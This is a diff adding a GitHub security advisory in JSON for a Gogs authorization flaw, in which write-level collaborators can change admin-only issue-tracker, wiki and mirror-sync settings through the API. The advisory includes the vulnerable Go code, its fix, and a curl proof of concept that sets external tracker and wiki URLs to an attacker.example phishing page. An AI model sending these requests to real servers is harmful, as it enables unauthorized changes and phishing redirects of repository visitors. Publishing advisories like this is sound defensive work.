@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-268j-37xf-pp52",
+  "modified": "2026-06-23T17:15:11.108711393Z",
+  "published": "2026-06-23T17:03:07Z",
+  "aliases": [
+    "CVE-2026-52808"
+  ],
+  "summary": "Gogs's write-level collaborators can mutate admin-only repository settings via API",
+  "details": "## Summary\n\nThree API endpoints — `PATCH /api/v1/repos/:owner/:repo/issue-tracker`, `PATCH /api/v1/repos/:owner/:repo/wiki`, and `POST /api/v1/repos/:owner/:repo/mirror-sync` — are gated by `reqRepoWriter()` rather than `reqRepoAdmin()`. The equivalent operations in the web UI sit behind `reqRepoAdmin`, which requires `AccessMode \u003e= AccessModeAdmin`. A write-level collaborator (who has `AccessMode == AccessModeWrite \u003c AccessModeAdmin`) can therefore call these API endpoints directly to disable the native issue tracker or wiki, inject attacker-controlled external tracker/wiki URLs that redirect all repository visitors, or trigger mirror sync — none of which they are authorized to do.\n\n## Severity\n\n**High** (CVSS 3.1: 7.1)\n\n`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L`\n\n- **Attack Vector:** Network — the API endpoints are reachable over HTTP/S.\n- **Attack Complexity:** Low — a single API call is sufficient; no chaining or race condition required.\n- **Privileges Required:** Low — only write-level collaborator access to the targeted repository is needed. The attacker does not need repo-admin or site-admin privileges.\n- **User Interaction:** None — the attacker acts unilaterally.\n- **Scope:** Unchanged — the impact is contained to the targeted repository's settings and its visitors.\n- **Confidentiality Impact:** None — the attacker does not read confidential data directly.\n- **Integrity Impact:** High — the attacker permanently mutates repository configuration, including injecting an external URL that redirects all visitors who click the Issues or Wiki tabs to an attacker-controlled site.\n- **Availability Impact:** Low — disabling the native issue tracker or wiki reduces the availability of those features for all repository participants.\n\n\n## Affected component\n\n- `internal/route/api/v1/api.go` — route registration (lines 365–367)\n- `internal/route/api/v1/repo_repo.go` — `issueTracker()` (line 400), `wiki()` (line 437), `mirrorSync()` (line 463)\n\n## CWE\n\n- **CWE-863**: Incorrect Authorization\n- **CWE-269**: Improper Privilege Management\n\n## Description\n\n### Three admin-equivalent API endpoints are protected by write-level middleware\n\n`api.go:365-367` registers the three settings endpoints with `reqRepoWriter()`:\n\n```go\n// internal/route/api/v1/api.go:365-367\nm.Patch(\"/issue-tracker\", reqRepoWriter(), bind(editIssueTrackerRequest{}), issueTracker)\nm.Patch(\"/wiki\", reqRepoWriter(), bind(editWikiRequest{}), wiki)\nm.Post(\"/mirror-sync\", reqRepoWriter(), mirrorSync)\n```\n\n`reqRepoWriter()` (defined at `api.go:131-138`) passes any user whose repository `AccessMode \u003e= AccessModeWrite`:\n\n```go\nfunc reqRepoWriter() macaron.Handler {\n    return func(c *context.Context) {\n        if !c.Repo.IsWriter() {\n            c.Status(http.StatusForbidden)\n            return\n        }\n    }\n}\n```\n\nThe handlers themselves perform no additional privilege check before mutating state:\n\n```go\n// internal/route/api/v1/repo_repo.go:400-428\nfunc issueTracker(c *context.APIContext, form editIssueTrackerRequest) {\n    _, repo := parseOwnerAndRepo(c)\n    ...\n    if form.EnableExternalTracker != nil {\n        repo.EnableExternalTracker = *form.EnableExternalTracker\n    }\n    if form.ExternalTrackerURL != nil {\n        repo.ExternalTrackerURL = *form.ExternalTrackerURL   // ← attacker-controlled URL written directly\n    }\n    ...\n    database.UpdateRepository(repo, false)   // ← no admin check before this call\n}\n```\n\nThe `wiki()` handler (lines 437–461) follows the same pattern, writing `repo.ExternalWikiURL` directly and calling `UpdateRepository` with no admin gate.\n\n### The web UI imposes a stricter admin requirement for the same operations\n\n`cmd/gogs/web.go:472` wraps the entire `/settings` subtree with `reqRepoAdmin`:\n\n```go\n// cmd/gogs/web.go:425-472\nm.Group(\"/:username/:reponame\", func() {\n    m.Group(\"/settings\", func() {\n        m.Combo(\"\").Get(repo.Settings).\n            Post(bindIgnErr(form.RepoSetting{}), repo.SettingsPost)\n        ...\n    }, ...)\n}, reqSignIn, context.RepoAssignment(), reqRepoAdmin, context.RepoRef())\n```\n\n`context.RequireRepoAdmin()` (defined at `context/repo.go:434-441`) requires `AccessMode \u003e= AccessModeAdmin`:\n\n```go\nfunc RequireRepoAdmin() macaron.Handler {\n    return func(c *Context) {\n        if !c.IsLogged || (!c.Repo.IsAdmin() \u0026\u0026 !c.User.IsAdmin) {\n            c.NotFound()\n            return\n        }\n    }\n}\n```\n\nIn the access mode hierarchy, `AccessModeWrite \u003c AccessModeAdmin`. A write-level collaborator satisfies `reqRepoWriter()` but does not satisfy `RequireRepoAdmin()`. The API path provides the write-level collaborator with capabilities that the UI correctly withholds.\n\n### Full execution chain\n\n1. **Attacker precondition**: Attacker is added as a repository collaborator with write access (`AccessMode == AccessModeWrite`).\n2. **API call**: `PATCH /api/v1/repos/OWNER/REPO/issue-tracker` with `Authorization: token WRITER_TOKEN` and body `{\"enable_external_tracker\":true,\"external_tracker_url\":\"https://attacker.example/phish\"}`.\n3. **Middleware**: `reqRepoWriter()` checks `c.Repo.IsWriter()` → `AccessMode \u003e= AccessModeWrite` → passes.\n4. **Handler**: `issueTracker()` sets `repo.EnableExternalTracker = true` and `repo.ExternalTrackerURL = \"https://attacker.example/phish\"`, then calls `database.UpdateRepository(repo, false)`. No admin check occurs.\n5. **Impact**: All visitors to the repository who click the \"Issues\" tab are redirected to the attacker's server. The native issue tracker is bypassed permanently until a repo admin reverses the change.\n\n## Proof of Concept\n\n```bash\n# Precondition: attacker is a collaborator with WRITE access, not repo admin.\n\n# 1) Redirect the Issues tab to an attacker-controlled phishing page\ncurl -i -X PATCH \"https://TARGET/api/v1/repos/OWNER/REPO/issue-tracker\" \\\n  -H \"Authorization: token WRITER_TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  --data '{\"enable_issues\":false,\"enable_external_tracker\":true,\"external_tracker_url\":\"https://attacker.example/phish\"}'\n# Expected: HTTP 204 No Content\n\n# 2) Redirect the Wiki tab to an attacker-controlled page\ncurl -i -X PATCH \"https://TARGET/api/v1/repos/OWNER/REPO/wiki\" \\\n  -H \"Authorization: token WRITER_TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  --data '{\"enable_wiki\":false,\"enable_external_wiki\":true,\"external_wiki_url\":\"https://attacker.example/phish-wiki\"}'\n# Expected: HTTP 204 No Content\n\n# 3) Force a mirror sync on a mirrored repository (potential resource abuse)\ncurl -i -X POST \"https://TARGET/api/v1/repos/OWNER/REPO/mirror-sync\" \\\n  -H \"Authorization: token WRITER_TOKEN\"\n# Expected: HTTP 202 Accepted\n```\n\n## Impact\n\n- A write-level collaborator can permanently replace the native issue tracker with an external URL under attacker control, redirecting all repository visitors who follow the Issues link to a phishing or malware-serving page.\n- The same redirect attack applies to the Wiki tab via the external wiki URL setting.\n- Both redirects remain active until a repo admin or owner manually reverses the setting; the attacker has no way to be removed from having already made the change.\n- Mirror sync can be triggered repeatedly, potentially causing unnecessary load on the upstream mirror source or consuming network resources.\n- All three operations are silent — no notification is sent to repo admins when these settings change via the API.\n\n## Recommended remediation\n\n### Option 1: Change middleware to `reqRepoAdmin()` on all three endpoints (preferred)\n\nReplace `reqRepoWriter()` with `reqRepoAdmin()` at the route registration level. This is a one-line change per endpoint and aligns the API authorization with the web UI's established policy.\n\n```go\n// internal/route/api/v1/api.go:365-367\nm.Patch(\"/issue-tracker\", reqRepoAdmin(), bind(editIssueTrackerRequest{}), issueTracker)\nm.Patch(\"/wiki\", reqRepoAdmin(), bind(editWikiRequest{}), wiki)\nm.Post(\"/mirror-sync\", reqRepoAdmin(), mirrorSync)\n```\n\n### Option 2: Add an explicit admin check inside the handlers\n\nAdd `c.Repo.IsAdmin()` checks at the top of `issueTracker()`, `wiki()`, and `mirrorSync()`. This is less preferred because it duplicates middleware logic in handler code, but it provides defense-in-depth if the route middleware is ever accidentally changed.\n\n```go\nfunc issueTracker(c *context.APIContext, form editIssueTrackerRequest) {\n    if !c.Repo.IsAdmin() {\n        c.Status(http.StatusForbidden)\n        return\n    }\n    ...\n}\n```\n\n## Credit\n\nThis vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "gogs.io/gogs",
+        "purl": "pkg:golang/gogs.io/gogs"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.14.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-268j-37xf-pp52/GHSA-268j-37xf-pp52.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gogs/gogs/security/advisories/GHSA-268j-37xf-pp52"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gogs/gogs/pull/8327"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gogs/gogs/commit/6283462119bd8894f1599d70339b5e823f99954a"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gogs/gogs"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/gogs/gogs/releases/tag/v0.14.3"
+    }
+  ]
+}
